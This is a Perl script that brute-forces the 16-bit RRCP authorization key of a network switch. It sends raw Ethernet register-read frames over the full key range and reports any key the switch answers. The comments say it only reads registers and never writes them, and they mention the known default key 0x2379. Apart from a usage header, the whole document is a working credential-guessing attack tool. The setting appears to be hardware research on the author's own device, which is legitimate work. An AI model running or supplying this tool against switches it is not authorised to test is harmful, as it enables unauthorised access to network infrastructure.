#!/usr/bin/env perl
# RRCP auth-key brute force.
#
# Looks for the 16-bit RRCP authorization key that makes the switch answer a
# GET (register read) request. Read-only: it only sends opcode 1 (get); it never
# sends opcode 2 (set). Needs root / CAP_NET_RAW.
#
# NOTE: the switch already answers *hello* with the default key 0x2379, so if the
# key alone gated register access, 0x2379 (tried first) would have worked. Expect
# no hit unless the device uses a different key for register ops.
#
# Usage:
#   rrcp_bruteforce.pl <iface> [switch-mac] [options]
# Options:
#   --dst bcast|switch   destination (default bcast; hello used broadcast)
#   --reg 0x0206         register to read (default 0x0206 = chip model id)
#   --start 0x0000       first key (default 0)
#   --end   0xffff       last key  (default 0xffff)
#   --batch 256          frames sent per listen window
#   --wait  0.5          seconds to listen per batch
use strict; use warnings;
use IO::Select;
use Time::HiRes qw(time);

use constant PF_PACKET => 17;
use constant SOCK_RAW  => 3;
use constant ETH_P_ALL => 0x0003;
sub htons { my $v = (shift) & 0xffff; return (($v & 0xff) << 8) | ($v >> 8); }
sub mac   { my $m = shift; return "\xff" x 6 if $m eq 'bcast'; $m =~ s/[:.\-]//g; return pack("H*", $m); }
sub hx    { my $s = shift; $s =~ s/^0x//i; return hex($s); }

my $iface = shift @ARGV // die "usage: $0 <iface> [switch-mac] [options]\n";
my $SWITCH_MAC = '48:22:54:40:a8:d0';
if (@ARGV && $ARGV[0] !~ /^--/) { $SWITCH_MAC = shift @ARGV; }
my %o = (dst=>'bcast', reg=>0x0206, start=>0, end=>0xffff, batch=>256, wait=>0.5);
while (@ARGV) {
    my $a = shift @ARGV;
    if    ($a eq '--dst')   { $o{dst}   = shift @ARGV; }
    elsif ($a eq '--reg')   { $o{reg}   = hx(shift @ARGV); }
    elsif ($a eq '--start') { $o{start} = hx(shift @ARGV); }
    elsif ($a eq '--end')   { $o{end}   = hx(shift @ARGV); }
    elsif ($a eq '--batch') { $o{batch} = shift @ARGV; }
    elsif ($a eq '--wait')  { $o{wait}  = shift @ARGV; }
    else { die "unknown option $a\n"; }
}

my $SWITCH = mac($SWITCH_MAC);
my $BCAST  = mac('bcast');
my $DST    = $o{dst} eq 'switch' ? $SWITCH : $BCAST;
my $dstname = $o{dst} eq 'switch' ? "switch($SWITCH_MAC)" : 'broadcast';

my $ifidx = do { open(my $f,"<","/sys/class/net/$iface/ifindex") or die "no iface $iface\n"; my $i=<$f>; chomp $i; $i };
my $src   = mac(do { open(my $f,"<","/sys/class/net/$iface/address") or die "no $iface addr\n"; my $m=<$f>; chomp $m; $m });

printf "iface=%s dst=%s reg=0x%04x keys=0x%04x..0x%04x batch=%d wait=%.2fs\n",
    $iface, $dstname, $o{reg}, $o{start}, $o{end}, $o{batch}, $o{wait};

socket(my $sock, PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) or die "raw socket: $!";
my $sel = IO::Select->new($sock);
my $sll = pack("v n V v C C a8", PF_PACKET, htons(0x8899), $ifidx, 0, 0, 6, $DST);

sub frame {
    my ($auth) = @_;
    my $payload = pack("C C n v V", 1, 1, $auth, $o{reg}, 0) . pack("V V", $auth, 0);
    my $f = $DST . $src . pack("n",0x8899) . $payload;
    $f .= "\0" x (60-length($f)) if length($f) < 60;
    return $f;
}

my $hits = 0;
my $t0 = time;
for (my $base = $o{start}; $base <= $o{end}; $base += $o{batch}) {
    my $hi = $base + $o{batch} - 1; $hi = $o{end} if $hi > $o{end};
    for my $a ($base .. $hi) { send($sock, frame($a), 0, $sll); }
    my $end = time + $o{wait};
    while (time < $end && $sel->can_read(0.05)) {
        my $buf; next unless recv($sock, $buf, 65535, 0);
        next unless length($buf) >= 14 && unpack("n", substr($buf,12,2)) == 0x8899;
        next unless substr($buf,6,6) eq $SWITCH;                 # only the switch
        my $p = substr($buf,14);
        my ($pr,$oc) = unpack("CC",$p);
        next unless $pr == 1;
        my ($auth,$reg,$data) = unpack("n v V", substr($p,2,8));
        my ($c1,$c2) = unpack("V V", substr($p,10,8));
        if (($oc & 0x80) && ($oc & 0x7f) == 1) {                 # GET reply!
            $hits++;
            printf "\n*** HIT *** auth=0x%04x reg=0x%04x data=0x%08x c1=0x%08x c2=0x%08x\n",
                $auth, $reg, $data, $c1, $c2;
        } else {
            printf "\n[?] unexpected reply from switch: proto=%d opcode=0x%02x auth=0x%04x\n", $pr,$oc,$auth;
        }
    }
    if ((($base) & 0xfff) == 0) {
        printf "  ... 0x%04x  (%.0fs, hits=%d)\r", $base, time-$t0, $hits;
    }
}
printf "\ndone: %d keys (%d..%d), %d hit(s)\n", ($o{end}-$o{start}+1), $o{start}, $o{end}, $hits;
exit($hits ? 0 : 1);
